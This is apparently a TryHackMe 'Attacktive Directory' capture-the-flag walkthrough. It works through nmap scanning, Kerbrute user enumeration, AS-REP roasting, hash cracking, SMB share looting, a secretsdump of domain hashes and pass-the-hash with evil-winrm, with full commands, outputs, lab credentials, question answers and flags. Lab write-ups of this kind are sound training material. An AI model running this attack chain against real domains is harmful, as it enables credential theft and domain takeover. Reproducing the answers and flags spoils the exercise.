Attacktive Directory - Medium

Installing Impacket:

sudo git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket
pip3 install -r /opt/impacket/requirements.txt
cd /opt/impacket/ && python3 ./setup.py install

Installing Bloodhound and Neo4j:

sudo apt install bloodhound neo4j

---

nmap scan for enumeration
Command: nmap -T4 -p- -A 10.10.119.253

---

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-04-01 17:47:23Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  tcpwrapped
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Not valid before: 2022-03-31T17:17:52
|_Not valid after:  2022-09-30T17:17:52
|_ssl-date: 2022-04-01T17:48:37+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2022-04-01T17:48:21+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  unknown
49673/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
49684/tcp open  msrpc         Microsoft Windows RPC
49698/tcp open  msrpc         Microsoft Windows RPC
49823/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-04-01T17:48:25
|_  start_date: N/A

---

1. What tool will allow us to enumerate port 139/445? - enum4linux

2. What is the NetBIOS-Domain Name of the machine? - THM-AD

3. What invalid TLD do people commonly use for their Active Directory Domain? - .local

---

As services such as Kerberos (key authentication service within AD) are running, we can use Kerbrute tool for brute force
Kerbrute - https://github.com/ropnop/kerbrute/releases
Command to setup binary: chmod a+x kerbrute_linux_amd64
Command to run kerbrute: ./kerbrute_linux_amd64
Brute force: ./kerbrute_linux_amd64 userenum --dc 10.10.119.253 -d spookysec.local userlist_kerberos.txt

---

[+] VALID USERNAME:       james@spookysec.local
[+] VALID USERNAME:       svc-admin@spookysec.local
[+] VALID USERNAME:       James@spookysec.local
[+] VALID USERNAME:       robin@spookysec.local
[+] VALID USERNAME:       darkstar@spookysec.local
[+] VALID USERNAME:       administrator@spookysec.local                                                                            
[+] VALID USERNAME:       backup@spookysec.local
[+] VALID USERNAME:       paradox@spookysec.local
[+] VALID USERNAME:       JAMES@spookysec.local
[+] VALID USERNAME:       Robin@spookysec.local
[+] VALID USERNAME:       Administrator@spookysec.local                                                                            
[+] VALID USERNAME:       Darkstar@spookysec.local
[+] VALID USERNAME:       Paradox@spookysec.local
[+] VALID USERNAME:       DARKSTAR@spookysec.local

---

1. What command within Kerbrute will allow us to enumerate valid usernames? - userenum

2. What notable account is discovered? - svc-admin

3. What is the other notable account is discovered? - backup

---

Now, with the help of enumerated usernames, we can attempt to abuse Kerberos using ASREPRoasting. We can use the GetNPUsers.py tool in Impacket.
Command: python3 /opt/impacket/examples/GetNPUsers.py spookysec.local/james -no-pass -dc-ip 10.10.119.253

We have to try this for all usernames to check from which accounts we can query a ticket without password.

---

[*] Getting TGT for svc-admin
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:e1076905ec7df91868b6a900bd77eb84$2e815ad6c986233a11770fa756fc9b2713190f09c121dd396692e197b4623ddca312118eb9bb59054550f6f14c3835a815b1dbf365c6ec4088a1d6b44930c2999c6132ab7c525f0a2857a1d1751013e18474beb4e6b2b81516494c8577f7ed76adae0bcfb00b605822f0832dbca188b196195675e85451fd57fbb6ddf74029a401d17101a546280c7d9825ad057f7133aa72fca4879c48070d4860db4d16670a7e89adfe37a32f6592ee95b2190d117c813ffa77fbadd6accc820574db5f5bef48cd0ad4f1da83baeb1f539e05cb50a6db2b55fa73d1d533cab8ef3a3db0e207fd03f65f061e1eff643249a205c4baef99ea

---

1. We have two user accounts that we could potentially query a ticket from. Which user account can you query a ticket from with no password? - svc-admin

2. Looking at the Hashcat Examples Wiki page, what type of Kerberos hash did we retrieve from the KDC? -  Kerberos 5, etype 23, AS-REP

3. What mode is the hash? - 18200

4. Now crack the hash with the modified password list provided, what is the user accounts password? - management2005

---

We can attempt enumeration again, with any shares that the domain controller may be giving out.

Command: smbclient -L //10.10.119.253 -W spookysec.local -U svc-admin
To list available shares

Here, the backup share contains a text file. We can use 'get' to transfer the file to our computer.
Command: smbclient //10.10.119.253/backup -W spookysec.local -U svc-admin

---

1. What utility can we use to map remote SMB shares? - smbclient

2. Which option will list shares? - -L

3. How many remote shares is the server listing? - 6

4. There is one particular share that we have access to that contains a text file. Which share is it? - backup

5. What is the content of the file? - YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw

6. Decoding the contents of the file, what is the full contents? - backup@spookysec.local:backup2517860

---

Now, we have the credentials for the backup account for the Domain Controller, with special permissions. So, we can use secretsdump.py from Impacket, to retrieve all password hashes that this account has to offer.

Command: python3 /opt/impacket/examples/secretsdump.py spookysec.local/backup@spookysec.local:backup2517860 -target-ip 10.10.119.253

---

Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::

---

1. What method allowed us to dump NTDS.DIT? - DRSUAPI

2. What is the Administrators NTLM hash? - 0e0363213e37b94221497260b0bcb4fc

3. What method of attack could allow us to authenticate as the user without the password? - pass the hash

4. Using a tool called Evil-WinRM what option will allow us to use a hash? - -H

---

Command: evil-winrm -i 10.10.119.253 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc

Flags for each account:

1. svc-admin - TryHackMe{K3rb3r0s_Pr3_4uth}

2. backup - TryHackMe{B4ckM3UpSc0tty!}

3. Administrator - TryHackMe{4ctiveD1rectoryM4st3r}
